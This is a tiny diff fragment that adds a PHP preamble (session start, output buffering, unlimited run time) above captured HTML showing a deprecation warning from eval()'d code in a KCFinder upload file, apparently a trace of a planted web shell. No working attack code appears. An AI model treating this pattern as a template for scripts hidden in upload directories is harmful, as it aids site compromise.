@@ -1,3 +1,7 @@
+<?php
+session_start();
+ob_start("ob_gzhandler");
+set_time_limit(0);
 <br />
 <b>Deprecated</b>:  Function ereg_replace() is deprecated in <b>/home/communed/www/kcfinder/upload/files/3.php(6) : eval()'d code</b> on line <b>1</b><br />
 <br />
